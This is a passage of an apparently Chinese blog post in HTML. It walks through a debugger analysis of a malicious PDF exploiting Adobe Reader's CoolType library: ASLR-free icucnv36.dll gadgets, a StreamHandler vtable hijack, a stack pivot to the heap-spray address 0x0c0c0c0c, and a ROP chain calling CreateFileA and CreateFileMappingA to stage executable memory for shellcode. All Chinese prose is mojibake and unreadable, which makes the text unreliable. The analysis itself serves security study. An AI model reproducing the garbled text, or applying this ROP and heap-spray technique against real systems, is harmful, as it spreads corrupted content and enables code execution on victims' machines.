<h3 id="3-ALSR"><a href="#3-ALSR" class="headerlink" title="3.ALSR"></a>3.ALSR</h3><p>ç»ˆäºæ¥äº†ä¸ªåå­—ä¸€æ ·çš„äº†ï¼Œåœ¨åŠ è½½ç¨‹åºçš„æ—¶å€™ä¸å†ä½¿ç”¨å›ºå®šçš„åŸºå€åŠ è½½ï¼Œæ”¯æŒASLRçš„ç¨‹åºåœ¨å…¶PEå¤´ä¸­ä¼šè®¾ç½®<br><code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code>æ ‡è¯†æ¥è¯´æ˜å…¶æ”¯æŒASLRã€‚ä¾‹å¦‚ï¼Œå¦‚æœ icucnv36.dll å¼€å¯äº† ASLRï¼Œé‚£ä¹ˆåŒä¸€ä¸ªä»£ç çš„åœ°å€ï¼Œå¯èƒ½æ˜¯ 0x4A80CB38ï¼Œä¹Ÿå¯èƒ½æ˜¯ 0x5A80CB38ã€‚ç”±äºæ— æ³•çŸ¥é“å‡†ç¡®çš„åœ°å€ï¼Œæ‰€ä»¥ä¹Ÿå°±æ— æ³•è·³è½¬åˆ°æƒ³è¦æ‰§è¡Œçš„ä»£ç ã€‚å¯ä»¥ç‚¹å‡»ä¸‹é¢è¿™ä¸ªå°å·¥å…·æ¥æŸ¥çœ‹å¯¹åº”åº“ä¸­æ˜¯å¦å¼€å¯äº†ALSR</p>
<p><a class="link"   href="http://www.scriptjunkie.us/files/pefinder.zip" >&gt;å°å·¥å…·&lt; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>ç”¨æ³•å¦‚ä¸‹ï¼š</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /b /w /s &quot;C:\Program Files\Adobe\*.dll&quot; | pefinder.exe -</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹å‰å°†å¯¹åº”0x12E6D0çš„æ ˆåœ°å€æŒ‡å‘çš„å³å°†ä¿®æ”¹çš„å‡½æ•°æŒ‡é’ˆæ”¹æˆ0x4A80CB38,ä»–ä½äºicucnv36ä¸‹ï¼ˆæŒ‘é€‰ä»–ä¸æ˜¯æ²¡æœ‰ç†ç”±ï¼‰ï¼Œæ‰“å¼€cmdæ‰§è¡Œä¸Šè¿°å‘½ä»¤æ¥æŸ¥çœ‹å“ªé‡Œæ²¡å¼€ALSR,å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/63d0f703918fa0ecdc5e47c7639759ee3c6ddb5b.jpg"
                     
                ></p>
<p>ä»‹ç»äº†å‡ ä¸ªæ¶‰åŠåˆ°çš„ä¿æŠ¤çŸ¥è¯†ï¼Œæ¥ä¸‹æ¥å†ç»§ç»­åˆ†æ</p>
<p>F8å•æ­¥åˆ°call CoolType.08001243å¤„ï¼Œä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œç„¶åå†æ¬¡å•æ­¥æ­¥è¿‡<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffcbbc69c78fc014a90f703ea08.jpg"
                     
                ></p>
<p>å‘ç°å¹¶æ²¡æœ‰å‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œå–æ¶ˆä¸Šé¢æ‰“çš„æ–­ç‚¹ï¼Œå†æ¥ä¸‹æ¥å•æ­¥è°ƒè¯•ï¼Œæœ€åå•æ­¥ä¼šåˆ°è¾¾ä¹‹å‰çš„ç¬¬ä¸‰ä¸ªæ–­ç‚¹å¤„ï¼Œå¦‚ä¸‹å›¾:<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d009b3de9c82d15881557a7bc50a19d8bd3e4220.jpg"
                     
                ></p>
<p>ç†è®ºä¸Šå¦‚æœå¡«å……å¤§é‡æ— å…³æ•°æ®ï¼Œæ˜¯å¯ä»¥æ‰¾åˆ°è¿™æ¡å…³é”®æ¼æ´çš„åœ°å€å€¼çš„ï¼Œä¸Šé¢å›¾ä¸­ç»™å‡ºäº†<code>eax</code>é‡Œé¢ä¿å­˜çš„å‡½æ•°æŒ‡é’ˆï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°æ¥ä¸‹æ¥å°±ä¼šè°ƒç”¨ä¸Šé¢çš„0x4A80CB38çš„æ±‡ç¼–æŒ‡ä»¤äº†ï¼Œé‡æ–°æ¥çœ‹çœ‹ä¸ºå•¥è·³è½¬åˆ°<code>call [eax]</code>æŒ‡ä»¤ï¼Œé¦–å…ˆctrl + F2æ¥é‡æ–°å¯åŠ¨ç¨‹åºï¼ŒæŒ‰ç…§ä¹‹å‰çš„æ­¥éª¤æˆ‘ä»¬æ­¥åˆ°è¿™é‡Œï¼Œå¦‚ä¸‹å›¾ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16cfd1b8abb6deb48f8d5464e1.jpg"
                     
                ></p>
<p>ä½¿ç”¨F7ï¼Œè¿›å…¥è¯¥å‡½æ•°åï¼Œå†æ­¤å•æ­¥è°ƒè¯•ï¼Œç›´åˆ°ä¸‹é¢è¿™æ¡æŒ‡ä»¤<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5d455ca3e14da81cb38db3df1.jpg"
                     
                ></p>
<p>æ‰§è¡Œè¯¥callåä¼šè·³åˆ°<code>call [eax]</code>,ä¸ºå•¥æï¼Ÿå†F7è·Ÿè¿›çœ‹çœ‹<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d01373f082025aaf30455c01beedab64024f1a80.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°è¿™å°±æ˜¯å‡½æ•°å†…éƒ¨äº†ï¼Œä¸Šé¢é‡ç‚¹æ ‡è®°çš„æŒ‡ä»¤å°†<code>ecx</code>çš„å€¼èµ‹ç»™äº†<code>eax</code>ï¼Œæˆ‘ä»¬æŸ¥çœ‹<code>ecx</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304e7f7a823094c8a786c8175c9b.jpg"
                     
                ></p>
<p>å³é”®<code>ecx</code>ç„¶åé€‰æ‹©follow in dump ï¼Œç„¶åå·¦ä¸‹è§’äºŒè¿›åˆ¶ä¼šå‡ºç°ç›¸åº”å€¼ï¼Œå‘ç°<code>ecx</code>å€¼æ‰€æŒ‡å‘çš„æ˜¯0x081A601Cï¼Œé€šè¿‡å³é”®äºŒè¿›åˆ¶çª—å£ï¼Œé€‰æ‹©longâ€“&gt;addressï¼Œæ¥æ–¹ä¾¿ç”¨åœ°å€å½¢å¼æ¥æŸ¥çœ‹å†…å­˜æ•°æ®ï¼Œæ­¤æ—¶è·³è½¬åˆ°0x81A601Cçœ‹çœ‹è¿™é‡Œå­˜æ”¾çš„æ˜¯ä»€ä¹ˆå®è´<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e712a338d4fc389b504ec26aa8.jpg"
                     
                ></p>
<p>ä¸éš¾çœ‹å‡ºè¿™é‡Œå­˜æ”¾çš„å¾ˆå¤šå‡½æ•°æŒ‡é’ˆï¼Œåˆ¤æ–­ä¸Šé¢çš„å‡½æ•°åœ°å€è¿™æ˜¯ä¸€ä¸ªè™šè¡¨æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥åˆ°IDAä¸­æŸ¥çœ‹è¯¥è™šè¡¨å†…å®¹</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rdata:081A6004 53 74 72 65 61 6D 48 61 6E 64+aStreamhandler db &#x27;StreamHandler&#x27;,0     ; DATA XREF: .data:off_821D31Câ†“o</span><br><span class="line">.rdata:081A6012 00 00 00 00 00 00             align 8</span><br><span class="line">.rdata:081A6018 2C 87 1E 08                   dd offset ??_R4StreamHandler@@6B@       ; const StreamHandler::`RTTI Complete Object Locator&#x27;</span><br><span class="line">.rdata:081A601C                               ; const StreamHandler::`vftable&#x27;</span><br><span class="line">.rdata:081A601C 16 B1 08 08                   ??_7StreamHandler@@6B@ dd offset sub_808B116</span><br><span class="line">.rdata:081A601C                                                                       ; DATA XREF: sub_801E529-18â†‘o</span><br><span class="line">.rdata:081A601C                                                                       ; sub_808AC54+11â†‘o</span><br><span class="line">.rdata:081A6020 AA B5 08 08                   dd offset sub_808B5AA</span><br><span class="line">.rdata:081A6024 62 99 08 08                   dd offset sub_8089962</span><br><span class="line">.rdata:081A6028 8C 95 08 08                   dd offset sub_808958C</span><br><span class="line">.rdata:081A602C 91 95 08 08                   dd offset nullsub_41</span><br><span class="line">.rdata:081A6030 AA B0 08 08                   dd offset nullsub_47</span><br><span class="line">.rdata:081A6034 85 AC 08 08                   dd offset sub_808AC85</span><br><span class="line">.rdata:081A6038 C7 95 08 08                   dd offset nullsub_37</span><br><span class="line">.rdata:081A603C 95 B0 08 08                   dd offset sub_808B095</span><br><span class="line">.rdata:081A6040 07 9E 08 08                   dd offset sub_8089E07</span><br><span class="line">.rdata:081A6044 6F 99 08 08                   dd offset sub_808996F</span><br><span class="line">.rdata:081A6048 A7 94 08 08                   dd offset sub_80894A7</span><br><span class="line">.rdata:081A604C ED 95 08 08                   dd offset sub_80895ED</span><br><span class="line">.rdata:081A6050 F2 95 08 08                   dd offset sub_80895F2</span><br><span class="line">.rdata:081A6054 C5 B0 08 08                   dd offset sub_808B0C5</span><br><span class="line">.rdata:081A6058 FC E4 01 08                   dd offset nullsub_48</span><br><span class="line">.rdata:081A605C F9 E4 01 08                   dd offset nullsub_49</span><br><span class="line">.rdata:081A6060 FF E4 01 08                   dd offset sub_801E4FF</span><br><span class="line">.rdata:081A6064 DA 94 08 08                   dd offset sub_80894DA</span><br><span class="line">.rdata:081A6068 F7 95 08 08                   dd offset sub_80895F7</span><br><span class="line">.rdata:081A606C F8 E4 01 08                   dd offset nullsub_50</span><br><span class="line">.rdata:081A6070 04 E5 01 08                   dd offset sub_801E504</span><br><span class="line">.rdata:081A6074 70 B0 08 08                   dd offset sub_808B070</span><br><span class="line">.rdata:081A6078 8A AC 08 08                   dd offset sub_808AC8A</span><br><span class="line">.rdata:081A607C 2F 99 08 08                   dd offset sub_808992F</span><br><span class="line">.rdata:081A6080 5B C3 01 08                   dd offset sub_801C35B</span><br><span class="line">.rdata:081A6084 34 99 08 08                   dd offset sub_8089934</span><br><span class="line">.rdata:081A6088 9B B5 08 08                   dd offset sub_808B59B</span><br><span class="line">.rdata:081A608C 37 99 08 08                   dd offset sub_8089937</span><br><span class="line">.rdata:081A6090 69 99 08 08                   dd offset nullsub_46</span><br><span class="line">.rdata:081A6094 45 9E 08 08                   dd offset sub_8089E45</span><br><span class="line">.rdata:081A6098 54 DC 01 08                   dd offset sub_801DC54</span><br><span class="line">.rdata:081A609C 45 DF 01 08                   dd offset sub_801DF45</span><br><span class="line">.rdata:081A60A0 F0 D5 01 08                   dd offset sub_801D5F0</span><br><span class="line">.rdata:081A60A4 0E C3 01 08                   dd offset sub_801C30E</span><br><span class="line">.rdata:081A60A8 3B C3 01 08                   dd offset sub_801C33B</span><br><span class="line">.rdata:081A60AC 4B C3 01 08                   dd offset sub_801C34B</span><br><span class="line">.rdata:081A60B0 1F 99 08 08                   dd offset sub_808991F</span><br><span class="line">.rdata:081A60B4 54 59 50 31 00                aTyp1 db &#x27;TYP1&#x27;,0                       ; DATA XREF: sub_808B116+275â†‘o</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ä¸Šå°å­¦çš„å¼Ÿå¼Ÿä¸€çœ¼çœ‹å‡ºæ­¤è™šè¡¨ç±»å‹ä¸º<code>StreamHandler</code>ï¼Œåº”è¯¥æ˜¯å¤„ç†PDFä¸­æµå¯¹è±¡çš„ç±»ï¼Œç„¶åæŸ¥çœ‹IDAä¸­ç›®å‰æ­£åœ¨æ‰§è¡Œçš„è¯­å¥ï¼ˆé€šè¿‡ODæ¥çœ‹ï¼‰</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0801BB21 55                            push    ebp</span><br><span class="line">.text:0801BB22 8B EC                         mov     ebp, esp</span><br><span class="line">.text:0801BB24 FF 75 20                      push    [ebp+arg_18]</span><br><span class="line">.text:0801BB27 8B 4D 08                      mov     ecx, [ebp+StreamHandler]</span><br><span class="line">.text:0801BB2A FF 75 1C                      push    [ebp+arg_14]</span><br><span class="line">.text:0801BB2D 8B 01                         mov     eax, [ecx]</span><br><span class="line">.text:0801BB2F FF 75 18                      push    [ebp+arg_10]</span><br><span class="line">.text:0801BB32 FF 05 A0 A6 23 08             inc     dword_823A6A0</span><br><span class="line">.text:0801BB38 FF 75 14                      push    [ebp+arg_C]</span><br><span class="line">.text:0801BB3B FF 75 10                      push    [ebp+arg_8]</span><br><span class="line">.text:0801BB3E FF 75 0C                      push    [ebp+arg_4]</span><br><span class="line">.text:0801BB41 FF 10                         call    dword ptr [eax]</span><br></pre></td></tr></table></figure></div>

<p>IDA ä¸Šé¢ä¸€æ®µä»£ç åæ±‡ç¼–æƒ…å†µå¦‚ä¸‹ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl sub_801BB21(</span><br><span class="line">        int (__thiscall ***StreamHandler)(_DWORD, int, int, int, int, int, int),</span><br><span class="line">        int a2,</span><br><span class="line">        int a3,</span><br><span class="line">        int a4,</span><br><span class="line">        int a5,</span><br><span class="line">        int a6,</span><br><span class="line">        int a7)</span><br><span class="line">&#123;</span><br><span class="line">  int (__thiscall **v7)(_DWORD, int, int, int, int, int, int); // eax</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  v7 = *StreamHandler;</span><br><span class="line">  ++dword_823A6A0;</span><br><span class="line">  result = (*v7)(StreamHandler, a2, a3, a4, a5, a6, a7);</span><br><span class="line">  if ( !(_BYTE)result )</span><br><span class="line">    --dword_823A6A0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¯¥ä»£ç æ®µæ˜¯ä¼ é€’7ä¸ªå‚æ•°ï¼Œå¦‚ä¸‹å›¾ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/94cad1c8a786c91721047ff38c3d70cf3ac757f0.jpg"
                     
                ></p>
<p>æ ˆä¸Šç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ä¹‹å‰<code>ecx</code>ä¿å­˜çš„å€¼ï¼Œè¯¥å€¼æ˜¯ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªè™šè¡¨æŒ‡é’ˆçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯<code>StreamHandler</code>å¯¹è±¡ï¼Œè¯¥ä»£ç é€†å‘çš„å¤§è‡´å«ä¹‰å°±æ˜¯è¿è¡Œè™šå‡½æ•°æŒ‡å‘çš„ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯0x0808B116,ç„¶åå…¶ç¬¬ä¸€ä¸ªå¯¹è±¡å°±æ˜¯<code>StreamHandler</code>,å¯ä»¥æŸ¥çœ‹è¯¥åœ°å€äºŒè¿›åˆ¶é™„è¿‘çš„æ•°å€¼<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/9d82d158ccbf6c81cd6e0122f93eb13532fa409a.jpg"
                     
                ></p>
<p>åœ¨å½“åˆè¦†ç›–å€¼çš„æ—¶å€™ï¼Œä¼šåœ¨æ­¤å¤„ä¹Ÿè¦†ç›–æ‰ä¸€ä¸ªå€¼ï¼Œè¿™é‡Œä¹Ÿå°±å‡ºç°äº†ä¸€å¼€å§‹çš„0x12E6D0,ä¹Ÿå°±æ˜¯ä¹‹å<code>call [eax]</code>çš„<code>eax</code>å€¼ï¼Œæ­¤æ—¶å†æ¬¡OD  F7 æ­¥å…¥ 0x808B116,ç„¶åå•æ­¥æ­¥è¿‡<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/279759ee3d6d55fb6a8c5bec28224f4a21a4ddb6.jpg"
                     
                ></p>
<p>åˆ°è¾¾è¿™æ¡è¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å°†edi + 0x3cåœ°å€æŒ‡å‘çš„å€¼èµ‹ç»™äº†<code>eax</code>ï¼Œè€Œè¿™ä¸ª<code>edi</code>ä¿å­˜çš„æ˜¯ä¹‹å‰<code>StreamHandler</code>å¯¹è±¡çš„é¦–åœ°å€ï¼ŒåŠ ä¸Š0x3cå°±å˜æˆäº†åˆšåˆšé‡Œé¢ä¿å­˜0x12E6D0çš„å€¼ï¼Œæ­¤æ—¶è¿™æ¡æŒ‡ä»¤æ‰§è¡Œå®Œæ¯•ï¼Œ<code>eax</code>ä¸­å°±æ˜¯è¯¥å€¼äº†ï¼Œå†ç„¶åå•æ­¥ä¼šå‘ç°ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/3b87e950352ac65c13bc4bb9bef2b21192138aba.jpg"
                     
                ></p>
<p>å“¦ï¼æˆ‘çš„å¦‚æ¥ä½›ç¥–(ä¸Šå¸æœ¬åœŸåŒ– æ²¡é”™å§ï¼Ÿ)ï¼Œè¿™ä¸æ˜¯ä¹‹å‰æ‰“çš„3å·æ–­ç‚¹å˜›ï¼Œè¿™ä¸‹ç»ˆäºçŸ¥é“äº†ä¸ºä»€ä¹ˆæœ€å<code>call eax</code>ä¼šæ˜¯è¿™ä¸ªå€¼äº†ï¼Œç„¶åå›åˆ°æ–­ç‚¹å¤„ï¼Œè¿™é‡Œä¼šè°ƒç”¨0x4A80CB38è¿™ä¸ªå‡½æ•°ï¼ŒæŒ‰ä¸‹F7è¿›å…¥è¯¥å‡½æ•°æŸ¥çœ‹ï¼Œè‡³æ­¤æº¢å‡ºéƒ¨åˆ†åˆ†æå®Œæ¯•</p>
<h2 id="5-æ ·æœ¬åˆ†æï¼ˆé˜¶æ®µäºŒï¼šROPé“¾ï¼‰"><a href="#5-æ ·æœ¬åˆ†æï¼ˆé˜¶æ®µäºŒï¼šROPé“¾ï¼‰" class="headerlink" title="5.æ ·æœ¬åˆ†æï¼ˆé˜¶æ®µäºŒï¼šROPé“¾ï¼‰"></a>5.æ ·æœ¬åˆ†æï¼ˆé˜¶æ®µäºŒï¼šROPé“¾ï¼‰</h2><p>æ¥ç€ä¸Šé¢ç»§ç»­åˆ†æï¼Œç°åœ¨è¿è¡Œåˆ°äº†icucnv36.dllä¸­0x4A80CB38è¿™ä¸ªåœ°å€çš„å‡½æ•°ï¼Œæˆ‘ä»¬è¿›å…¥æŸ¥çœ‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fc7e9bf81fafa40f4afb054c.jpg"
                     
                ></p>
<p>è¿™é‡Œçœ‹åˆ°æ˜¯é¦–å…ˆå°†<code>ebp</code>æŠ¬äº†0x794å­—èŠ‚ï¼ˆæ ˆä»é«˜åˆ°ä½æ‰©å±•ï¼‰ï¼Œç„¶åæ‰§è¡Œ<code>leave</code>ï¼Œç†Ÿæ‚‰æ ˆè¿ç§»çš„åŒå­¦å¯èƒ½ååˆ†äº†è§£ï¼Œå®ƒå®é™…ä¸Šçš„æ“ä½œç›¸å½“äº<code>mov esp ebp; pop ebp;</code>æ­¤æ—¶æŒ‡ä»¤æ‰§è¡Œå®Œæ¯•ï¼Œæ ˆé¡¶åº”è¯¥æŒ‡å‘0x0012E4E0ï¼ˆEBP + 0x794 + 4 &#x3D; 0x12DD48 + 0x794 + 4ï¼‰,ä¸‹é¢å‘ç°æœçœŸå¦‚æ­¤ï¼Œç„¶åæ ˆé¡¶æŒ‡å‘çš„æŒ‡é’ˆå°±ä¼šè¢«æˆ‘ä»¬çš„<code>retn</code>æŒ‡ä»¤è°ƒç”¨<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9fc5922ef61c8701a08bfb75.jpg"
                     
                ></p>
<p>ä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯æ‰§è¡Œ 0x4A82A714,ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°è¿™é‡Œæ˜¯ç®€å•çš„popå‡ºæ ˆä¸Šçš„å€¼åˆ°è¾¾<code>esp</code>ï¼Œç›¸å½“äºæ˜¯å†æ¬¡æ ˆè¿ç§»äº†ï¼Œè¿™é‡Œä¹‹å‰æ„é€ çš„0x0C0C0C0Cæ˜¯å¸¸ç”¨çš„å †å–·åœ°å€ï¼Œåœ¨åé¢ä¼šä»‹ç»å †å–·çš„åŸç†ï¼Œç›®å‰ç¨‹åºè¿è¡Œæƒ…å†µå¦‚ä¸‹ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd2f88c9ec4c24ab18962b372c.jpg"
                     
                ></p>
<p>æ‰§è¡Œåï¼Œæ ˆè¿ç§»åˆ°0x0c0c0c0c<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/2cf5e0fe9925bc31609b2d521bdf8db1ca137031.jpg"
                     
                ></p>
<p>ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°æ˜¯å°†0x4A8A0000å¼¹åˆ°<code>ecx</code>ä¸Šï¼Œç»§ç»­è·Ÿè¿›ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå¦‚ä¸‹å›¾ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/c2cec3fdfc039245b8b3cec5c294a4c27c1e25f1.jpg"
                     
                ></p>
<p>å‘ç°æ˜¯ä¿å­˜<code>eax</code>åˆ°åˆšåˆšèµ‹å€¼<code>ecx</code>çš„åœ°å€é‚£å„¿ï¼Œä¹Ÿå°±æ˜¯0x4A8A0000ï¼Œç„¶åä¸Šé¢çš„å‡½æ•°retè¿‡åï¼Œä¼šå†æ¬¡ä»æ ˆä¸Šå¼¹å‡ºå€¼åˆ°<code>eax</code>å½“ä¸­</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">4A801F90    58              pop eax                           ; &lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">4A801F91    C3              retn</span><br><span class="line">4A801F92    33C0            xor eax,eax</span><br><span class="line">4A801F94    C3              retn</span><br><span class="line">4A801F95 &gt;  8B4C24 04       mov ecx,dword ptr ss:[esp+0x4]    ; icucnv36.4A80B692</span><br><span class="line">4A801F99    85C9            test ecx,ecx                      ; icucnv36.4A8A0000</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œå¼¹å‡ºçš„å€¼æ˜¯<CreateFileA>çš„ç¬¦å·å€¼ï¼Œç„¶åè¿›å…¥<code>retn</code>ï¼Œå‘ç°æ˜¯<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16d2b1b5abb6deb48f8d546481.jpg"
                     
                ></p>
<p>ç›´æ¥jmp [eax]ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æ‰§è¡Œ<code>kernel32.CreateFileA</code>è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”æ­¤æ—¶åœ¨æ ˆä¸Šä¹Ÿå·²ç»æ„é€ å¥½äº†å‚æ•°å¦‚ä¸‹ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb13090813d99854564e93584b92.jpg"
                     
                ></p>
<p>æ­¥å…¥è¿™ä¸ªå‡½æ•°æŸ¥çœ‹å†…éƒ¨å®ç°æƒ…å†µ<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/54fbb2fb43166d2296323a5e032309f79152d2b7.jpg"
                     
                ></p>
<p>ç§»æ­¥åˆ°å³ä¸‹è§’è¿™æ˜¯è§£æçš„å‚æ•°ï¼Œè¿™ä¸ª<code>CreateFileA</code>å‡½æ•°çš„åŠŸèƒ½æ˜¯æ‰“å¼€æŸä¸ªæ–‡ä»¶ï¼Œå¦‚æœæ²¡è¿™ä¸ªæ–‡ä»¶å°±ä¼šåˆ›å»ºï¼Œå…¶åä¸º<code>iso88591</code>,ä½¿ç”¨ctrl + F9æ¥æ‰§è¡Œåˆ°è¿”å›ï¼Œç„¶åæŸ¥çœ‹æ˜¯å¦åˆ›å»ºå‡ºäº†è¿™ä¸ªæ–‡ä»¶ï¼ˆä¼šè¢«åˆ›å»ºåœ¨æ¡Œé¢ä¸Šï¼‰</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/f2deb48f8c5494eec5de20d368f5e0fe98257e7f.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°æ ‡æ³¨çš„é‚£ä¸ªæ–‡ä»¶ï¼Œç¡®å®æ˜¯<code>iso88591</code>(è¿™é‡Œæ³¨æ„å¦‚æœwindowsçš„éšè—æ–‡ä»¶å¤¹é€‰é¡¹å¼€ç€é‚£å°±çœ‹ä¸åˆ°ï¼Œè®°å¾—åˆ°æ§åˆ¶é¢æ¿è®¾ç½®ä¸€ä¸‹ä¹‹åç»§ç»­è°ƒè¯•)ï¼Œåˆšåˆšå·²ç»è¿”å›ï¼Œå¦‚ä¸‹ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d833c895d143ad4b5cdc690ac7025aafa50f060d.jpg"
                     
                ></p>
<p>æ­¤æ—¶<code>eax</code>åº”è¯¥æ˜¯ä¸Šé¢å‡½æ•°çš„è¿”å›å€¼ï¼Œå…¶ä¸ºæˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„æ–‡ä»¶å¥æŸ„ï¼Œä¹Ÿå°±æ˜¯0x33cï¼Œç„¶åäº¤æ¢<code>eax</code>å’Œ<code>edi</code>ï¼Œå†æ¬¡æ­¥å…¥<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/622762d0f703918f6e9f1300143d269758eec4aa.jpg"
                     
                ></p>
<p>å°†æ ˆä¸Šçš„8å¼¹ç»™<code>ebx</code>ï¼Œæ¥ç€æ­¥å…¥<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/80cb39dbb6fd5266ac6c12deee18972bd50736b0.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„å›¾ä¸­å°†<code>edi</code>,ä¹Ÿå°±æ˜¯ä¹‹å‰çš„æ–‡ä»¶å¥æŸ„ä¼ ç»™äº†esp + ebp*2çš„åœ°å€ï¼Œå¯ä»¥çœ‹åˆ°<code>ebx</code>ä¸ºåˆšåˆšçš„8ï¼Œä¹Ÿå°±æ˜¯è·ç¦»æ ˆé¡¶åç§»0x10å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯å°†0x0c0c0c6cä¸ŠåŸæ¥çš„å€¼0xFFFFFFFFæ”¹ä¸ºæ–‡ä»¶å¥æŸ„ï¼Œä¹Ÿå°±æ˜¯0x33c,ç„¶åctrl+F9è·³è½¬åˆ°è¿”å›<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e9b8a80aa0ac2d56284356868.jpg"
                     
                ></p>
<p>æ­¤æ—¶å†å°†<code>CreateFileMappingA</code>çš„å‡½æ•°åœ°å€å¼¹åˆ°<code>eax</code>ï¼Œç„¶åæ­¥å…¥å¯ä»¥å‘ç°æ˜¯ç›´æ¥æ‰§è¡Œ<code>eax</code>ä¿å­˜çš„å‡½æ•°åœ°å€<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/b3b7d0a20cf431add9396df30e36acaf2fdd9814.jpg"
                     
                ></p>
<p>å†…éƒ¨æ‰§è¡Œæƒ…å†µå•æ­¥æ­¥å…¥ä¹‹åå¦‚ä¸‹ï¼Œå¹¶ä¸”å¯ä»¥å‘ç°å…¶ä¸­çš„æ ˆä¸Šçš„å‡½æ•°å‚æ•°,å…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯åˆšåˆšçš„æ–‡ä»¶å¥æŸ„ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ä¼ é€’çš„ä¿æŠ¤æªæ–½ï¼Œå¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯å¯æ‰§è¡Œå¯è¯»å¯å†™çš„ï¼Œå› æ­¤å°±å¯ä»¥ä¼ é€’<code>shellcode</code>å¤åˆ¶åˆ°æ­¤å¤„æ‰§è¡Œ<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688bae39c6ee1c27d1ed31b2412.jpg"
                     
                ></p>
